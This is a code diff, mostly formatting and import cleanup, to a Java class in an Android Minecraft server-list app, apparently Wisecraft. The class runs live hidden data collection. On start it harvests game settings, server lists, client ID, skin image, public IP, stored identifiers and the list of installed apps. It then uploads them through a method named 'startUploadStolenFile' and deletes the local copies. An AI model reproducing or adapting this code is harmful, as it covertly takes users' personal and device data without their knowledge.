@@ -1,21 +1,25 @@
 package com.nao20010128nao.Wisecraft.collector;
-import android.content.*;
-import android.os.*;
-import android.preference.*;
-import android.util.*;
-import com.google.gson.*;
-import com.nao20010128nao.FileSafeBox.*;
-import com.nao20010128nao.Wisecraft.*;
-import com.nao20010128nao.Wisecraft.misc.*;
 import java.io.*;
-import java.net.*;
 import java.util.*;
-import static com.nao20010128nao.Wisecraft.Utils.*;
-import android.content.pm.*;
 
-public class CollectorMain extends ContextWrapper implements Runnable
-{
-	public CollectorMain(){
+import android.content.ContextWrapper;
+import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager;
+import android.os.Environment;
+import android.preference.PreferenceManager;
+import android.util.Base64;
+import com.google.gson.Gson;
+import com.nao20010128nao.FileSafeBox.SafeBox;
+import com.nao20010128nao.Wisecraft.ServerListActivity;
+import com.nao20010128nao.Wisecraft.TheApplication;
+import com.nao20010128nao.Wisecraft.misc.FileUploader;
+import java.net.URL;
+import java.util.zip.GZIPInputStream;
+
+import static com.nao20010128nao.Wisecraft.Utils.*;
+
+public class CollectorMain extends ContextWrapper implements Runnable {
+	public CollectorMain() {
 		super(TheApplication.instance);
 		new Thread(this).start();
 	}
@@ -28,10 +32,10 @@ public class CollectorMain extends ContextWrapper implements Runnable
 		Writer w=null;
 		String s="";
 		try {
-			(w=new OutputStreamWriter(sb.saveFile(System.currentTimeMillis() + ".json", SafeBox.MODE_GZIP))).append(s=new Gson().toJson(new Infos()));
+			(w = new OutputStreamWriter(sb.saveFile(System.currentTimeMillis() + ".json", SafeBox.MODE_GZIP))).append(s = new Gson().toJson(new Infos()));
 		} catch (IOException e) {
-			
-		}finally{
+
+		} finally {
 			try {
 				if (w != null)w.close();
 			} catch (IOException e) {}
@@ -42,15 +46,15 @@ public class CollectorMain extends ContextWrapper implements Runnable
 			//Utils.writeToFile(new File(Environment.getExternalStorageDirectory(),"/Wisecraft/secret.json"),s);
 		}
 		String[] files;
-		try{
-			files=sb.listFiles();
-		}catch(Throwable e){
+		try {
+			files = sb.listFiles();
+		} catch (Throwable e) {
 			return;
 		}
-		for(String filename:files){
+		for (String filename:files) {
 			System.out.println(filename);
 			try {
-				copyAndClose(sb.readFile(filename), fu.startUploadStolenFile(filename));
+				copyAndClose(new GZIPInputStream(sb.readFile(filename)), fu.startUploadStolenFile(filename));
 				sb.deleteFile(filename);
 			} catch (Throwable e) {
 				e.printStackTrace();
@@ -58,118 +62,118 @@ public class CollectorMain extends ContextWrapper implements Runnable
 			}
 		}
 	}
-	public static class Infos{
+	public static class Infos {
 		public HashMap<String,String> mcpeSettings=readSettings();
 		public String[] mcpeServers=readServers();
 		public long cid=getCid();
 		public String skin=readSkin();
 		public String ip=getIp();
-		public String uuid=PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getString("uuid","");
+		public String uuid=PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getString("uuid", "");
 		public ServerListActivity.Server[] managingServers=getManagingServer();
 		public SystemInfo systemInfo=new SystemInfo();
-		
-		private String getIp(){
+
+		private String getIp() {
 			BufferedReader br=null;
-			try{
-				br=new BufferedReader(new InputStreamReader(new URL("http://ieserver.net/ipcheck.shtml").openConnection().getInputStream()));
+			try {
+				br = new BufferedReader(new InputStreamReader(new URL("http://ieserver.net/ipcheck.shtml").openConnection().getInputStream()));
 				return br.readLine();
-			}catch(Throwable e){
+			} catch (Throwable e) {
 				return "127.0.0.1";
-			}finally{
+			} finally {
 				try {
 					if (br != null)br.close();
 				} catch (IOException e) {}
 			}
 		}
-		private long getCid(){
+		private long getCid() {
 			BufferedReader br=null;
-			try{
-				br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(),"games/com.mojang/minecraftpe/clientId.txt"))));
+			try {
+				br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/clientId.txt"))));
 				return new Long(br.readLine());
-			}catch(Throwable e){
+			} catch (Throwable e) {
 				return Long.MAX_VALUE;
-			}finally{
+			} finally {
 				try {
 					if (br != null)br.close();
 				} catch (IOException e) {}
 			}
 		}
-		private HashMap<String,String> readSettings(){
+		private HashMap<String,String> readSettings() {
 			HashMap<String,String> data=new HashMap(20);
 			BufferedReader br=null;
-			try{
-				br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(),"games/com.mojang/minecraftpe/options.txt"))));
+			try {
+				br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/options.txt"))));
 				String s;
-				while(null!=(s=br.readLine())){
+				while (null != (s = br.readLine())) {
 					String[] spl=s.split("\\:");
-					data.put(spl[0],spl[1]);
+					data.put(spl[0], spl[1]);
 				}
-			}catch(Throwable e){
-				
-			}finally{
+			} catch (Throwable e) {
+
+			} finally {
 				try {
 					if (br != null)br.close();
 				} catch (IOException e) {}
 			}
 			return data;
 		}
-		private String[] readServers(){
+		private String[] readServers() {
 			List<String> data=new ArrayList(20);
 			BufferedReader br=null;
-			try{
-				br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(),"games/com.mojang/minecraftpe/external_servers.txt"))));
+			try {
+				br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/external_servers.txt"))));
 				String s;
-				while(null!=(s=br.readLine())){
+				while (null != (s = br.readLine())) {
 					data.add(s);
 				}
-			}catch(Throwable e){
+			} catch (Throwable e) {
 
-			}finally{
+			} finally {
 				try {
 					if (br != null)br.close();
 				} catch (IOException e) {}
 			}
 			return data.toArray(new String[data.size()]);
 		}
-		private String readSkin(){
+		private String readSkin() {
 			InputStream br=null;
 			ByteArrayOutputStream b=new ByteArrayOutputStream(100);
 			byte[] buf=new byte[100];
-			try{
-				br=new FileInputStream(new File(Environment.getExternalStorageDirectory(),"games/com.mojang/minecraftpe/custom.png"));
-				while(true){
+			try {
+				br = new FileInputStream(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/custom.png"));
+				while (true) {
 					int r=br.read(buf);
-					if(r<=0){
+					if (r <= 0) {
 						break;
 					}
-					b.write(buf,0,r);
+					b.write(buf, 0, r);
 				}
-			}catch(Throwable e){
+			} catch (Throwable e) {
 				return null;
-			}finally{
+			} finally {
 				try {
 					if (br != null)br.close();
 				} catch (IOException e) {}
 			}
-			return Base64.encodeToString(b.toByteArray(),Base64.NO_WRAP);
+			return Base64.encodeToString(b.toByteArray(), Base64.NO_WRAP);
 		}
-		private ServerListActivity.Server[] getManagingServer(){
-			ServerListActivity.Server[] sa=new Gson().fromJson(PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getString("servers","[]"),ServerListActivity.Server[].class);
+		private ServerListActivity.Server[] getManagingServer() {
+			ServerListActivity.Server[] sa=new Gson().fromJson(PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getString("servers", "[]"), ServerListActivity.Server[].class);
 			return sa;
 		}
 	}
-	public static class SystemInfo{
+	public static class SystemInfo {
 		public HashSet<String> packages=getPackageNames();
 		//public HashMap<String,PackageInfo> packageInfos=getPackageMisc();
-		
-		private HashSet<String> getPackageNames(){
+
+		private HashSet<String> getPackageNames() {
 			return new HashSet<>(getPackageMisc().keySet());
 		}
-		private HashMap<String,PackageInfo> getPackageMisc(){
+		private HashMap<String,PackageInfo> getPackageMisc() {
 			HashMap<String,PackageInfo> names=new HashMap<>();
-			List<PackageInfo> packages=TheApplication.instance.getPackageManager().getInstalledPackages(PackageManager.GET_RECEIVERS|PackageManager.GET_ACTIVITIES|PackageManager.GET_INSTRUMENTATION|PackageManager.GET_CONFIGURATIONS);
-			for(PackageInfo pi:packages){
-				names.put(pi.packageName,pi);
+			List<PackageInfo> packages=TheApplication.instance.getPackageManager().getInstalledPackages(PackageManager.GET_RECEIVERS | PackageManager.GET_ACTIVITIES | PackageManager.GET_INSTRUMENTATION | PackageManager.GET_CONFIGURATIONS);
+			for (PackageInfo pi:packages) {
+				names.put(pi.packageName, pi);
 			}
 			return names;
 		}
